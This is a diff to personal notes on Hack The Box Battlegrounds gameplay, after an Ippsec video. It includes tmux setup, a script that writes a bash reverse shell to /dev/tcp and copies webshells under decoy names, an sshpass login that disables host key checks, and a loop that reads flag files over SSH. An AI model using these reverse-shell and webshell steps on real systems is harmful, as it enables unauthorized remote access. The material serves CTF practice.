@@ -5,6 +5,7 @@
 Try to, at some point I want to master hacking in a battlegrounds context. This hope is that this will morph into an instructional Art of War for Hacking. From absolute novice to master.
 
 ## Ippsec Introductional Scripting
+
 [Hack The Box Hacking Battlegrounds - Cyber Mayhem Gameplay with Ippsec](https://www.youtube.com/watch?v=o42dgCOBkRk)
 
 This section is notation and inpsired by Ippsec's "{"workflow"}" from around Oct 2020. Methods change and this document should also reflect that knowledge is power. Knowing your enemy and what they know is power. Defense and Attack are both in a context of conflict are the same thing - action to end conflict.
@@ -22,8 +23,9 @@ tmux new-window -t BLUE
 tmux new-window -t MSF
 tmux new-window -t ATK
 
-tmxu send-keys -t HOME 'cp bg/ /tmp; cd tmp/bg' #setup 
+tmux send-keys -t HOME 'cp bg/ /tmp; cd tmp/bg' #setup 
 tmux send-keys -t HOME './startBGs.sh'
+tmux send-keys -t MSF 'msf'
 ```
 
 2. StartBG.sh 
@@ -31,7 +33,9 @@ tmux send-keys -t HOME './startBGs.sh'
 #!/bin/bash
 
 cp -r www-skel/ www/
+# Change $IP to another
 sed -i "s/$IP/$1/g" www/*
+# Copy decoy variants names of webshells
 cp www/$reverseshell www/$decoy-name
 cp www/$reverseshell www/$decoy-name 
 echo "bash -c 'bash -i >& /dev/tcp/$1/$port 0>&1'" >> www/shell.sh
@@ -51,17 +55,19 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```bash
 #!/bin/bash
 # Ippsec castle access script from Hack the Box Hacking Battlegrounds video
+# If you dont have the -o managing ssh will be hell 
 sshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeysChecking=no root@$1
 ```
 
 4. getflags.sh 
 This script will access the castles access the hostkeys and print out the flags. It will ask for a password if the hostkey is NOT there.
 ```bash
+#!/bin/bash
 for i in $(seq 105 108); do
         echo "10.10.110.$i"
         ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" \
                 -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" \
-                -i $privatekey \
+                -i $privatekey \ # private key directory
                 root@10.10.110.$i "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null
         done
 ```
@@ -73,14 +79,16 @@ for i in $(seq 105 108); do
 8. Configure Burp proxy(if using firefox to Hack from) `Proxy -> Options -> Intercept Client Request -> Add -> Match Relationship = IP address; Match condition 10.10.110.100-120` and disabling Websockets Messages on the same Proxy tab, Options `Intercept WebSockets Messages -> untick Intercept client-to-server messages & untick Intercept server-to-client messages`. This stop the background page slowing down request cycling stopping you from intercepting Battleground relevant pages.
 
 ## On Castle Enumeration
+
 ```bash
 ps -aef --forest
 
+
+```
 ## References
 
 [Hack The Box Hacking Battlegrounds - Cyber Mayhem Gameplay with Ippsec](https://www.youtube.com/watch?v=o42dgCOBkRk)
 [Tmux Scripting](https://tao-of-tmux.readthedocs.io/en/latest/manuscript/10-scripting.html)
 
 
-Cyberwarfare
 
